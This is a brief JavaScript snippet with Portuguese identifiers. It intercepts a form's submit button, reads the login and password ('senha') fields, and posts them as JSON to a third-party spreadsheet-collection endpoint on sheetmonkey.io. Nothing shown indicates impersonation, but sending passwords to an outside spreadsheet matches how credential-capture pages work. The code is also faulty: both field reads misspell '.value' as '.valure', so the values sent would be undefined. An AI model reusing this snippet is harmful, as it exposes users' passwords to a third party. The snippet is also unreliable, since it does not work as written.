const enviar = document.querySelector("#submit")

enviar.addEventListener('click',(evento)=>{
    evento.preventDefault()
    
    const login = document.querySelector("#login").valure
    const senha = document.querySelector("#senha").valure

    fetch('https://api.sheetmonkey.io/form/kDAtwkbtrC6C5oQcremCsj',{
        method: 'post',
        headers:{
            'Accept': 'application/json',
            'content-type': 'application/json',
        },
        body: JSON.stringify({login , senha})
    })
})